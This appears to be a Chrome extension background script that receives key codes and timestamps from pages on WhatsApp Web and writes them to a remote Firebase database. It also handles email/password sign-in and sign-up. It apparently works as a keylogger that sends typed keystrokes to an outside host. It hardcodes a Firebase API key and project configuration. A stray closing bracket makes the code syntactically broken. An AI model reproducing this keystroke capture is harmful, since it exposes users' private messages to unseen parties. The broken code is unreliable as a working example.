// Upload Data to firebase database

WHATSAPP_WEB = "https://web.whatsapp.com/"
SIGN_IN_ACTION = "SIGNIN"
SIGN_UP_ACTION = "SIGNUP"

const config = {
    apiKey: "AIzaSyABnZ9KDeJiJxqswHy7rJqVhP5Qu5DOxRo",
    authDomain: "anona-dd0ad.firebaseapp.com",
    databaseURL: "https://anona-dd0ad.firebaseio.com",
    projectId: "anona-dd0ad",
    storageBucket: "anona-dd0ad.appspot.com",
    messagingSenderId: "126637111077"
  };

const FIREBASEANONA = firebase.initializeApp(config);

function writeClientData(key, time){
    FIREBASEANONA.database().ref().set({
        keyCode: key,
        timeStamp: time
    })
}

function onMessage(request, sender){
	console.log(sender)
	if(sender.url == WHATSAPP_WEB){
		console.log(request.key + "- " + request.time);
		writeClientData(request.key, request.time);
	}
	else{
		if(request.action == SIGN_IN_ACTION){
			firebase.auth().signInWithEmailAndPassword(request.email, request.password);
			});
		}
		if(request.action == SIGN_UP_ACTION)
			firebase.auth().createUserWithEmailAndPassword(request.email, request.password);
			
	}
}

chrome.runtime.onMessage.addListener(onMessage);